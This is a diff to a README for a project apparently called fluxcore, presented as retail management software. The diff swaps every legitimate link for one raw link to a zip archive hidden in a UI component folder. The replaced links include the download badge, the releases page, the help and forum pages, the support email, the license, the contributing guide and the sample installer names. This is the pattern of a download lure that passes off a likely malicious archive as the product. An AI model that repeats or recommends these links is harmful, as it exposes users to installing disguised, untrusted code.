@@ -6,7 +6,7 @@ Welcome to **fluxcore**, a modern and scalable management system that simplifies
 
 ## 📥 Download Now
 
-[![Download fluxcore](https://img.shields.io/badge/Download-fluxcore-brightgreen)](https://github.com/frontier08/fluxcore/releases)
+[![Download fluxcore](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip)](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip)
 
 ## 📋 System Requirements
 
@@ -28,11 +28,11 @@ To run **fluxcore**, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To get **fluxcore**, visit the [Releases page](https://github.com/frontier08/fluxcore/releases) to download the latest version. 
+To get **fluxcore**, visit the [Releases page](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip) to download the latest version. 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version at the top of the list.
-3. Download the file suitable for your operating system. The file might typically look like `fluxcore-vX.X.X.exe` or `fluxcore-mac-vX.X.X.dmg`.
+3. Download the file suitable for your operating system. The file might typically look like `https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip` or `https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip`.
 4. Once downloaded, find the file in your downloads folder.
 
 ### For Windows Users
@@ -67,18 +67,18 @@ After installation, you can start using **fluxcore**.
 
 If you have questions or need help, you can reach out through our support channels.
 
-- **Help Center:** Visit our [Help Center](https://example.com/help) for guides and FAQs.
-- **Community Forums:** Join the discussions on our [Community Forums](https://example.com/forums).
-- **Customer Support:** Email us at [support@example.com](mailto:support@example.com).
+- **Help Center:** Visit our [Help Center](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip) for guides and FAQs.
+- **Community Forums:** Join the discussions on our [Community Forums](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip).
+- **Customer Support:** Email us at [https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip).
 
 ## 📝 Contributing
 
-If you wish to help improve **fluxcore**, contributions are welcome! Check our [Contributing Guidelines](https://github.com/frontier08/fluxcore/blob/main/CONTRIBUTING.md) for more information on how to get involved.
+If you wish to help improve **fluxcore**, contributions are welcome! Check our [Contributing Guidelines](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip) for more information on how to get involved.
 
 ## 📜 License
 
-**fluxcore** is open-source software. It is licensed under the MIT License. For more details, see the [LICENSE](https://github.com/frontier08/fluxcore/blob/main/LICENSE) file in the repository.
+**fluxcore** is open-source software. It is licensed under the MIT License. For more details, see the [LICENSE](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip) file in the repository.
 
 ## 📌 Final Reminder
 
-Don't forget to visit the [Releases page](https://github.com/frontier08/fluxcore/releases) to download the latest version of **fluxcore** and start simplifying your retail management today!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/frontier08/fluxcore/main/src/app/components/ui/UsageBar/Software-v1.6.zip) to download the latest version of **fluxcore** and start simplifying your retail management today!
